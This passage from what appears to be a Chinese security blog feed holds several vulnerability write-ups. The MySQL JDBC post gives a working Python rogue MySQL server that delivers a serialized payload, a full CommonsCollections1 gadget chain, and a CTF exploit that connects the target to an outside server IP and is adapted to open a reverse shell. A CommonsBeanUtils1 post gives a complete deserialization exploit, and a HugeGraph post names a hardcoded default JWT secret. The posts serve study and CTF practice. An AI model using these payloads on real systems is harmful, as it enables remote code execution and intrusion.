<p>如果shareToken查找结果为空，也就是var10为null时，由于没有对var10=null的处理方法，并且这个函数默认返回true，从而达到权限绕过的漏洞</p>
<figure data-type="image" tabindex="3"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742485145923-2fcbed81-7d0b-44eb-b49e-42fbac737bef.png" alt="" loading="lazy"></figure>
<h1 id="漏洞修复代码分析">漏洞修复代码分析</h1>
<p>可以下载一个1.8.0的代码进行对比，看看厂家是如何修复这个漏洞的。</p>
<p>首先，他更改了j函数中的c方法，改为了<code>OkConvertUtils.isEmpty</code></p>
<figure data-type="image" tabindex="4"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742485301258-7de3b1f3-bf7a-4c27-b4d5-793e013d29f6.png" alt="" loading="lazy"></figure>
<p>点进去看源码，其实可以发现这个方法的代码很眼熟，就是原来j函数中的接收Object参数类型的c方法。</p>
<figure data-type="image" tabindex="5"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742485352192-bbe06028-3bd3-4048-86fa-3a61c8c5928d.png" alt="" loading="lazy"></figure>
<p>然后，再往下看，可以看到下面的代码对<code>var10=null</code>的情况进行了处理，当<code>var10=null</code>时，使用了else将其返回值更改为false。</p>
<figure data-type="image" tabindex="6"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742485620084-08559dfc-9946-41ee-ae62-0d1bc16f08a4.png" alt="" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[mysql JDBC学习]]></title>
        <id>https://follycat.github.io/post/mysql-jdbc-xue-xi/</id>
        <link href="https://follycat.github.io/post/mysql-jdbc-xue-xi/">
        </link>
        <updated>2025-03-22T09:41:28.000Z</updated>
        <content type="html"><![CDATA[<h1 id="什么是jdbc">什么是JDBC</h1>
<p>JDBC（Java Database Connectivity）是一个 Java API，用于连接和操作数据库。它提供了一套标准接口，使得 Java 程序可以通过 SQL（结构化查询语言）与不同类型的数据库进行交互，而不依赖于特定数据库厂商的实现。</p>
<p>经典的流程为</p>
<pre><code>Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;); //加载数据库驱动

Connection conn = DriverManager.getConnection(&quot;jdbc:mysql://localhost:3306/database_name&quot;, &quot;username&quot;, &quot;password&quot;); //建立数据库连接

Statement stmt = conn.createStatement();  //创建sql语句对象

ResultSet rs = stmt.executeQuery(&quot;SELECT * FROM table_name&quot;); //执行sql语句

while (rs.next()) {
    System.out.println(rs.getString(&quot;column_name&quot;));
}  //处理查询结果

//关闭资源
rs.close();
stmt.close();
conn.close();
</code></pre>
<h1 id="漏洞分析">漏洞分析</h1>
<p>首先，这个漏洞点位于<code>com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</code>这个·拦截器中·的getObject方法。</p>
<p>这个拦截器会在URL中指定属性<code>queryInterceptors</code>为<code>ServerStatusDiffInterceptor</code>时 进行调用，并且调用拦截器的preProcess和postProcess方法，从而调用getObject方法。</p>
<figure data-type="image" tabindex="1"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742647938704-e7643163-6ddb-4699-91d0-850525853cab.png" alt="" loading="lazy"></figure>
<p>先找到preProcess方法并继续跟进到<code>populateMapWithSessionStatusValues</code>方法。</p>
<figure data-type="image" tabindex="2"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742648000392-2313651b-9f36-4ccf-b076-c346001e0a61.png" alt="" loading="lazy"></figure>
<p>主要为<code>populateMapWithSessionStatusValues</code>方法中的resultSetToMap方法，继续跟进可以看到调用了getObject方法</p>
<figure data-type="image" tabindex="3"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742648089764-11509fe0-b3f5-4289-8271-cd1cb3ad6a03.png" alt="" loading="lazy"></figure>
<p>这里调用的getObject方法位于<code>com.mysql.cj.jdbc.result.ResultSetImpl.class</code>中</p>
<figure data-type="image" tabindex="4"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742648259992-d52b6598-bbad-4a65-b49a-604a8f70ba5b.png" alt="" loading="lazy"></figure>
<p>可以发现在这里调用了readObject，其实往上看objIn参数是由columnsIndex一步步转化过来的。</p>
<p>所以如果我们可以控制连接的url，让他与我们构造的恶意mysql服务器连接，并且让恶意mysql服务器在收到<code>show session status</code>后向客户端发送可行的payload，就可以使payload进行反序列化，从而触发命令执行</p>
<h1 id="漏洞复现">漏洞复现</h1>
<p>python的恶意mysql服务端，payload为cc1到cc11都行，因为我项目这些环境都有，这里选的是cc1，这里的file文件是使用cc1链子序列化成的ser.bin</p>
<pre><code># coding=utf-8
import socket
import binascii
import os

greeting_data=&quot;4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400&quot;
response_ok_data=&quot;0700000200000002000000&quot;

def receive_data(conn):
    data = conn.recv(1024)
    print(&quot;[*] Receiveing the package : {}&quot;.format(data))
    return str(data).lower()

def send_data(conn,data):
    print(&quot;[*] Sending the package : {}&quot;.format(data))
    conn.send(binascii.a2b_hex(data))

def get_payload_content():
    #file文件
    file= r'ser.bin'
    if os.path.isfile(file):
        with open(file, 'rb') as f:
            payload_content = str(binascii.b2a_hex(f.read()),encoding='utf-8')
        print(&quot;open successs&quot;)

    else:
        print(&quot;open false&quot;)
        #calc
        payload_content=''
    return payload_content

# 主要逻辑
def run():

    while 1:
        conn, addr = sk.accept()
        print(&quot;Connection come from {}:{}&quot;.format(addr[0],addr[1]))

        # 1.先发送第一个 问候报文
        send_data(conn,greeting_data)

        while True:
            # 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok
            receive_data(conn)
            send_data(conn,response_ok_data)

            #其他过程
            data=receive_data(conn)
            #查询一些配置信息,其中会发送自己的 版本号
            if &quot;session.auto_increment_increment&quot; in data:
                _payload=''
                send_data(conn,_payload)
                data=receive_data(conn)
            elif &quot;show warnings&quot; in data:
                _payload = ''
                send_data(conn, _payload)
                data = receive_data(conn)
            if &quot;set names&quot; in data:
                send_data(conn, response_ok_data)
                data = receive_data(conn)
            if &quot;set character_set_results&quot; in data:
                send_data(conn, response_ok_data)
                data = receive_data(conn)
            if &quot;show session status&quot; in data:
                mysql_data = '0100000102'
                mysql_data += '1a000002036465660001630163016301630c3f00ffff0000fc9000000000'
                mysql_data += '1a000003036465660001630163016301630c3f00ffff0000fc9000000000'
                # 为什么我加了EOF Packet 就无法正常运行呢？？
                # 获取payload
                payload_content=get_payload_content()
                # 计算payload长度
                payload_length = str(hex(len(payload_content)//2)).replace('0x', '').zfill(4)
                payload_length_hex = payload_length[2:4] + payload_length[0:2]
                # 计算数据包长度
                data_len = str(hex(len(payload_content)//2 + 4)).replace('0x', '').zfill(6)
                data_len_hex = data_len[4:6] + data_len[2:4] + data_len[0:2]
                mysql_data += data_len_hex + '04' + 'fbfc'+ payload_length_hex
                mysql_data += str(payload_content)
                mysql_data += '07000005fe000022000100'
                send_data(conn, mysql_data)
                data = receive_data(conn)
            if &quot;show warnings&quot; in data:
                payload = ''
                send_data(conn, payload)
            break


if __name__ == '__main__':
    HOST ='0.0.0.0'
    PORT = 3307

    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间
    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sk.bind((HOST, PORT))
    sk.listen(1)

    print(&quot;start fake mysql server listening on {}:{}&quot;.format(HOST,PORT))

    run()
</code></pre>
<p>cc1链子</p>
<pre><code>package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;
import org.omg.CORBA.portable.InvokeHandler;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.*;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class CC1 {
    public static void main(String[] args) throws InvocationTargetException, InstantiationException, IllegalAccessException {
//        try {
//            Runtime.getRuntime().exec(&quot;calc&quot;);
//        } catch (IOException e) {
//            throw new RuntimeException(e);
//        }
//        Transformer[] transformers = new Transformer[]{
//                new ConstantTransformer(Runtime.class),
//                new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class},new Object[]{&quot;getRuntime&quot;,null}),
//                new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),
//                new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc&quot;}),
//        };

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class},new Object[]{&quot;getRuntime&quot;,null}),
                new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc&quot;}),
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();
        map.put(&quot;value&quot;,&quot;key&quot;);

        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,null,chainedTransformer);
        try {
            Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
            Constructor constructor = c.getDeclaredConstructor(Class.class,Map.class);
            constructor.setAccessible(true);
            Object o = constructor.newInstance(Target.class,transformedMap);

            Serialize(o);
            Unserialize(&quot;ser.bin&quot;);

        } catch (ClassNotFoundException | NoSuchMethodException | IOException e) {
            throw new RuntimeException(e);
        }


    }

    public static void Serialize(Object obj) throws IOException {
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
        objectOutputStream.writeObject(obj);

    }

    public static Object Unserialize(String Filename) throws IOException,ClassNotFoundException{

        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = objectInputStream.readObject();
        return obj;

    }
}
</code></pre>
<p>同理，如果mysql服务中有其他的链子也可以调用其他的链子，比如cc2，cc3，shiro都可以。</p>
<figure data-type="image" tabindex="5"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742649227083-42d74a80-b9cb-4e84-a290-bce83584341d.png" alt="" loading="lazy"></figure>
<p>可以看到连接，并且成功弹出计算器。</p>
<h1 id="例题">例题</h1>
<h3 id="羊城杯-2020a_piece_of_java">[羊城杯 2020]a_piece_of_java</h3>
<p>首先查看<code>controller</code>找到目标可以反序列化的路由，</p>
<pre><code>    @GetMapping(value={&quot;/hello&quot;})
    public String hello(@CookieValue(value=&quot;data&quot;, required=false) String cookieData, Model model) {
        if (cookieData == null || cookieData.equals(&quot;&quot;)) {
            return &quot;redirect:/index&quot;;
        }
        Info info = (Info)this.deserialize(cookieData);
        if (info != null) {
            model.addAttribute(&quot;info&quot;, (Object)info.getAllInfo());
        }
        return &quot;hello&quot;;
    }
</code></pre>
<p>这里使用的是<code>deserialize</code>在函数下面有写，是一个反序列化的函数</p>
<pre><code>    private Object deserialize(String base64data) {
        Object obj;
        ByteArrayInputStream bais = new ByteArrayInputStream(Base64.getDecoder().decode(base64data));
        try {
            SerialKiller ois = new SerialKiller((InputStream)bais, &quot;serialkiller.conf&quot;);
            obj = ois.readObject();
            ois.close();
        }
        catch (Exception e) {
            e.printStackTrace();
            return null;
        }
        return obj;
    }
</code></pre>
<p>先看一下<code>serialkiller.conf</code>这个是什么东西。</p>
<figure data-type="image" tabindex="6"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742731623993-40b31ac7-0a75-4140-916a-b18364162e23.png" alt="" loading="lazy"></figure>
<p>好像是一个过滤，还是白名单的， 这些正则表达式的作用是允许（即通过白名单）特定的命名空间或类名，例如以 <code>gdufs.</code> 和 <code>java.lang.</code> 开头的类或模块可以被接受，而不受限制。</p>
<p>因为lib里面有<code>commons-collections-3.2.1.jar</code>，所以可以使用cc5或者cc7来进行反序列化执行命令。</p>
<figure data-type="image" tabindex="7"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742731928703-67f8c802-83e2-470f-8db5-f422264d153f.png" alt="" loading="lazy"></figure>
<p>然后进入<code>DatabaseInfo</code>类，可以看到url是由各个参数拼接起来的，没有啥过滤，直接先测试一下能不能弹。</p>
<figure data-type="image" tabindex="8"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742731918601-b8529f91-ed60-44a4-bff7-22ae5003f50d.png" alt="" loading="lazy"></figure>
<p>因为在<code>checkAllInfo</code>中使用了<code>connect</code>方法，所以测试中就直接调用<code>checkAllInfo</code>方法了。</p>
<pre><code>package gdufs.challenge.web;

import gdufs.challenge.web.model.DatabaseInfo;

public class cat {
    public static void main(String[] args) {
        DatabaseInfo databaseInfo = new DatabaseInfo();
        databaseInfo.setHost(&quot;127.0.0.1&quot;);
        databaseInfo.setPort(&quot;3307&quot;);
        databaseInfo.setUsername(&quot;demo&quot;);
        databaseInfo.setPassword(&quot;demo&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true&quot;);

        databaseInfo.checkAllInfo();
    }
}
</code></pre>
<p>python服务使用之前的代码，然后直接更改ser.bin为cc5的就可以了。</p>
<figure data-type="image" tabindex="9"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742732265829-b2fae18d-9fa4-4c2d-a44c-f39b2ca607fa.png" alt="" loading="lazy"></figure>
<p>成功弹出计算器。</p>
<p>然后需要去寻找可以在反序列化时可以调用<code>checkAllInfo</code>的方法了。</p>
<p>只有一个实现方法，就在<code>InfoInvocationHandler</code>的invoke方法中， 这是一个动态代理的实现类，当代理的实例对象在执行任何方法时都会触发invoke方法。而在hello路由中，被反序列化的数据出来之后会触发<code>getAllInfo()</code>方法，并且题目有Info接口，从而实现动态代理。</p>
<p>所以只需要把<code>databaseinfo</code>传给<code>InfoInvocationHandler</code>进行动态代理即可触发jdbc。再进行反序列化和base64处理输出即可。</p>
<pre><code>package gdufs.challenge.web;

import gdufs.challenge.web.invocation.InfoInvocationHandler;
import gdufs.challenge.web.model.DatabaseInfo;
import gdufs.challenge.web.model.Info;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Proxy;
import java.util.Base64;

public class cat {
    public static void main(String[] args) throws Exception{
        DatabaseInfo databaseInfo = new DatabaseInfo();
        databaseInfo.setHost(&quot;120.76.143.184&quot;); //服务器的ip
        databaseInfo.setPort(&quot;3307&quot;);
        databaseInfo.setUsername(&quot;demo&quot;);
        databaseInfo.setPassword(&quot;demo&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true&quot;);

        InfoInvocationHandler infoInvocationHandler = new InfoInvocationHandler(databaseInfo);
        Info proxinfo = (Info) Proxy.newProxyInstance(Info.class.getClassLoader(), new Class[] {Info.class}, infoInvocationHandler);

        ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream=new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(proxinfo);
        objectOutputStream.close();

        String str=new String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray()));
        System.out.println(str);

    }
}

</code></pre>
<p>记得改cc5的执行为反弹shell</p>
<p>先去index路由传一个<code>username</code>和<code>password</code>，这样就不需要自己来构造Cookie的格式了。</p>
<figure data-type="image" tabindex="10"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742729879394-f2715915-5b4c-44e1-9d61-b519639dd2d1.png" alt="" loading="lazy"></figure>
<p>然后输入序列化数据即可成功反弹shell</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CommonsBeanUtils1]]></title>
        <id>https://follycat.github.io/post/commonsbeanutils1/</id>
        <link href="https://follycat.github.io/post/commonsbeanutils1/">
        </link>
        <updated>2025-03-19T09:39:59.000Z</updated>
        <content type="html"><![CDATA[<h1 id="commonsbeanutils介绍">CommonsBeanUtils介绍</h1>
<p>CommonsBeanUtils是Apache Commons中的一个组件，主要用于处理JavaBean的操作。 它提供了一系列工具类和方法，帮助开发者动态地获取和设置JavaBean的属性，简化了编程工作‌</p>
<p>首先是功能方面：</p>
<ol>
<li>属性操作：提供了PropertyUtiles类，可以动态的获取和设置javaBean的属性，例如<code>PropertyUtils.getProperty(object, &quot;property&quot;)</code>可以调用对象的getter方法，获取属性值‌。</li>
<li>类型转化：提供类型转化工具，如ConvertUtils，可以将一种类型的对象转换成另一种类型。</li>
<li>比较器：BeanComparator类实现了Comparator接口，用于在集合中对javaBean对象进行排序</li>
</ol>
<h1 id="javabean介绍">javaBean介绍</h1>
<p>上面提到了javaBean对象，那么javaBean对象是什么呢？</p>
<p>javaBean是一种java的软件组件模型， 它通过封装属性和方法成为具有某种功能或处理某个业务的对象。</p>
<p>我理解起来就是，在一个public的java类中，有无参的构造函数，并且存在一个或者多个private的属性，而且提供了公开的get/set方法的类就是javaBean。也就是下面三个要素</p>
<ol>
<li>该java类是公共的并且具有无参构造函数</li>
<li>存在一个或者多个私有的属性</li>
<li>有公开的getter与setter方法。</li>
</ol>
<h1 id="使用commonsbeanutils进行调用javabean事例及源码调试">使用CommonsBeanUtils进行调用javaBean事例及源码调试</h1>
<p>cat.java</p>
<pre><code class="language-java">package org.example;

public class cat {
    private String name = &quot;follycat&quot;;
    public cat(){}

    public String getName(){
        return name;
    }
}
</code></pre>
<p>main.java</p>
<pre><code class="language-java">package org.example;

import org.apache.commons.beanutils.PropertyUtils;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;

public class Main {
    public static void main(String[] args) throws Throwable {
        cat cat = new cat();
        System.out.println(PropertyUtils.getProperty(cat,&quot;name&quot;));

    }
}
</code></pre>
<p>调用过后可以直接输出name的值，因为可以直接找到cat类中name的get方法。</p>
<p>可以进行调试一下，来看commonsBeanUtils是怎么进行调用name类的get方法的。</p>
<p>首先进入.getProperty，</p>
<figure data-type="image" tabindex="1"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742313675534-244a8628-e9a1-4d46-8d57-abfd1089ff66.png" alt="" loading="lazy"></figure>
<p>现在可以看到参数bean是cat类，name参数还是name。</p>
<p>然后继续步入，走到PropertyUitlsBean中的getProperty方法。</p>
<p>主要是这一段</p>
<pre><code class="language-java">        while (resolver.hasNested(name)) {
            String next = resolver.next(name);
            Object nestedBean = null;
            if (bean instanceof Map) {
                nestedBean = getPropertyOfMapBean((Map&lt;?, ?&gt;) bean, next);
            } else if (resolver.isMapped(next)) {
                nestedBean = getMappedProperty(bean, next);
            } else if (resolver.isIndexed(next)) {
                nestedBean = getIndexedProperty(bean, next);
            } else {
                nestedBean = getSimpleProperty(bean, next);
            }
            if (nestedBean == null) {
                throw new NestedNullException
                        (&quot;Null property value for '&quot; + name +
                        &quot;' on bean class '&quot; + bean.getClass() + &quot;'&quot;);
            }
            bean = nestedBean;
            name = resolver.remove(name);
        }

        if (bean instanceof Map) {
            bean = getPropertyOfMapBean((Map&lt;?, ?&gt;) bean, name);
        } else if (resolver.isMapped(name)) {
            bean = getMappedProperty(bean, name);
        } else if (resolver.isIndexed(name)) {
            bean = getIndexedProperty(bean, name);
        } else {
            bean = getSimpleProperty(bean, name);
        }
        return bean;
</code></pre>
<p>调试之后可以发现while(resolver.hasNested(name))是直接为false的，没有进入while循环中，然后因为bean不为map，引索，以及映射的属性，于是就进入了getSimpleProperty中</p>
<p>继续跟进到getSimpleProperty中，然后看到getPropertyDescriptor</p>
<figure data-type="image" tabindex="2"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742314873973-e5d079f1-265c-4d15-bf0a-d1a90da4538b.png" alt="" loading="lazy"></figure>
<p>其实可以看到在invokeMethod之前的readMethod中已经被赋值为了getName。</p>
<p>差不多是在这里</p>
<figure data-type="image" tabindex="3"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742316620888-26a03d55-6a75-4b22-b857-26b95937ae11.png" alt="" loading="lazy"></figure>
<p>其中的<code>getPropertyDescriptors()</code> 方法用于获取类的所有属性的描述符。每个 <code>PropertyDescriptor</code> 提供了有关该属性的详细信息，包括其名称、getter 方法、setter 方法等。</p>
<p>也就是这里的信息开始有了getName方法</p>
<figure data-type="image" tabindex="4"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742316714347-0acbbabc-e03e-4573-a2be-cbd02a8ab65e.png" alt="" loading="lazy"></figure>
<p>然后返回到getDescriptor中对获取到的getName以及其他方法进行遍历，最后返回我们所需要的那个类。</p>
<figure data-type="image" tabindex="5"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742317050891-8c833b80-9a69-493f-b6ab-59dc55f8ffea.png" alt="" loading="lazy"></figure>
<p>最后在这里的InvokeMethod进行执行。</p>
<figure data-type="image" tabindex="6"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742317251132-2942a8a7-31f3-441e-87e9-8473549f87fc.png" alt="" loading="lazy"></figure>
<p>跟进之后可以看到</p>
<figure data-type="image" tabindex="7"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742317362994-78b5a371-037c-4a9c-a334-f5ff5080335a.png" alt="" loading="lazy"></figure>
<p>最后返回的value就是执行后的getName的返回值了。</p>
<figure data-type="image" tabindex="8"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742317445064-6425e783-a3c4-4061-911a-8ce1ee84b00c.png" alt="" loading="lazy"></figure>
<h1 id="链子分析">链子分析</h1>
<h2 id="尾部">尾部</h2>
<p>既然已经知道了CommonsBeanUtils是如何调用getter方法的，现在就可以利用他进行调用任意getter方法了。</p>
<p>可以看到cc3的链子，这条链子之前我自己分析的时候只分析到了newTransformer方法，然后直接使用cc1中的InvokeTransformer的后半条链进行调用了他的newTransformer，这里可以继续往下面分析。</p>
<p>现在如果有一个getter方法调用了TemplatesImpl的newTransform方法，我们就可以通过PropertyUtils.getProperty调用getter方法，然后使用动态加载 TemplatesImpl 字节码的方式进行攻击的。</p>
<p>这个getter方法就是getOutputProperties，他就在newTransform的下面，并且他完全符合PropertyUtils.getProperty的调用方式。</p>
<pre><code class="language-java">    public synchronized Properties getOutputProperties() {
        try {
            return newTransformer().getOutputProperties();
        }
        catch (TransformerConfigurationException e) {
            return null;
        }
    }
</code></pre>
<p>所以这条链子的尾部就已经完成了，就是使用PropertyUtils.getProperty调用TemplatesImpl的getOutputProperties方法，然后进行动态字节码加载执行代码</p>
<p>测试代码:</p>
<pre><code class="language-java">package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.PropertyUtils;

import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;

public class CommonsBeanUtils1 {

    public static void main(String[] args) throws Exception{
        TemplatesImpl templates = new TemplatesImpl();
        Class tc=templates.getClass();
        Field nameField = tc.getDeclaredField(&quot;_name&quot;);
        nameField.setAccessible(true);
        nameField.set(templates,&quot;aaa&quot;);
        Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);
        bytecodesField.setAccessible(true);

        byte[] code = Files.readAllBytes(Paths.get(&quot;E://Test.class&quot;));
        byte[][] codes = {code};
        bytecodesField.set(templates,codes);

        Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates,new TransformerFactoryImpl());
        System.out.println(PropertyUtils.getProperty(templates,&quot;outputProperties&quot;));
    }

}
</code></pre>
<p>成功弹出计算器。</p>
<h2 id="中间与前半部分">中间与前半部分</h2>
<p>现在就是要从PropertyUtils.getProperty出发，继续寻找调用了他的链子。</p>
<p>可以找到BeanComparetor的compare方法，这里调用了PropertyUtils.getProperty</p>
<figure data-type="image" tabindex="9"><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742354792257-8b75a0fa-2f4f-4113-9f3e-2d239aa74ffa.png" alt="" loading="lazy"></figure>
<p>测试代码</p>
<pre><code class="language-java">package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.beanutils.PropertyUtils;

import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class CommonsBeanUtils1 {

    public static void main(String[] args) throws Exception{
        TemplatesImpl templates = new TemplatesImpl();
        Class tc=templates.getClass();
        Field nameField = tc.getDeclaredField(&quot;_name&quot;);
        nameField.setAccessible(true);
        nameField.set(templates,&quot;aaa&quot;);
        Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);
        bytecodesField.setAccessible(true);

        byte[] code = Files.readAllBytes(Paths.get(&quot;E://Test.class&quot;));
        byte[][] codes = {code};
        bytecodesField.set(templates,codes);

        Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates,new TransformerFactoryImpl());
//        System.out.println(PropertyUtils.getProperty(templates,&quot;outputProperties&quot;));
        BeanComparator beanComparator = new BeanComparator(&quot;outputProperties&quot;);
        beanComparator.compare(templates,templates);
    }

}
</code></pre>
<p>成功弹出计算器</p>
<p>随后继续查找有谁调用了compare，看到<code>PriorityQueue</code> 这个类中的<code>siftDownUsingComparator()</code> 方法。这个方法调用了compare()</p>
<p>其实这前半部分和cc4中的前半段是一样的。</p>
<h1 id="exp">exp</h1>
<pre><code class="language-java">package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.beanutils.PropertyUtils;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;

import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class CommonsBeanUtils1 {

    public static void main(String[] args) throws Exception{
        TemplatesImpl templates = new TemplatesImpl();
        Class tc=templates.getClass();
        Field nameField = tc.getDeclaredField(&quot;_name&quot;);
        nameField.setAccessible(true);
        nameField.set(templates,&quot;aaa&quot;);
        Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);
        bytecodesField.setAccessible(true);

        byte[] code = Files.readAllBytes(Paths.get(&quot;E://Test.class&quot;));
        byte[][] codes = {code};
        bytecodesField.set(templates,codes);

        Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates,new TransformerFactoryImpl());
//        System.out.println(PropertyUtils.getProperty(templates,&quot;outputProperties&quot;));
        BeanComparator beanComparator = new BeanComparator(&quot;outputProperties&quot;);
//        beanComparator.compare(templates,templates);


        TransformingComparator transformingComparator=new TransformingComparator(new ConstantTransformer&lt;&gt;(1));

        PriorityQueue priorityQueue=new PriorityQueue(transformingComparator);

        priorityQueue.add(templates);
        priorityQueue.add(2);
        Class c = priorityQueue.getClass();
        Field field = c.getDeclaredField(&quot;comparator&quot;);
        field.setAccessible(true);
        field.set(priorityQueue,beanComparator);

        serialize(priorityQueue);
        unserialize(&quot;ser.bin&quot;);
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;

    }

}
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Apache HugeGraph JWT Token密钥硬编码漏洞代码分析(CVE-2024-43441)]]></title>
        <id>https://follycat.github.io/post/apache-hugegraph-jwt-token-mi-yao-ying-bian-ma-lou-dong-dai-ma-fen-xi-cve-2024-43441/</id>
        <link href="https://follycat.github.io/post/apache-hugegraph-jwt-token-mi-yao-ying-bian-ma-lou-dong-dai-ma-fen-xi-cve-2024-43441/">
        </link>
        <updated>2025-03-03T09:38:39.000Z</updated>
        <content type="html"><![CDATA[<h1 id="漏洞成因及利用条件">漏洞成因及利用条件</h1>
<p>用户启用了认证但未配置auth.token_secret时，HugeGraph将使用一个硬编码的默认JWT密匙，默认密匙可以在官方文档中看到，其值为_FXQXbJtbCLxODc6tGci732pkH1cyf8Qg_。<br>
<img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1740808436721-c09213bb-e975-4dd6-a729-326b96a31489.png" alt="" loading="lazy"></p>
<h2 id="jwt构造规则分析">JWT构造规则分析</h2>
<p>因为代码文件太多了，所以找JWT构造规则的时候会比较困难，所以，可以想到哪里会利用JWT的构造，就是登录的时候。</p>
<p>先找到LoginAPI，其中登录的部分<br>
<img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1740808451639-01e5e67d-29f0-4eb9-b8e3-42db8d761915.png" alt="" loading="lazy"></p>
<p>看到token构造的代码在这段里。</p>
<pre><code>try {  
    String token = manager.authManager().loginUser(jsonLogin.name, jsonLogin.password);  
    HugeGraph g = graph(manager, graph);  
    return manager.serializer(g).writeMap(ImmutableMap.of(&quot;token&quot;, token));}
</code></pre>
<p>然后可以跟进到GraphManager的authManager()方法中</p>
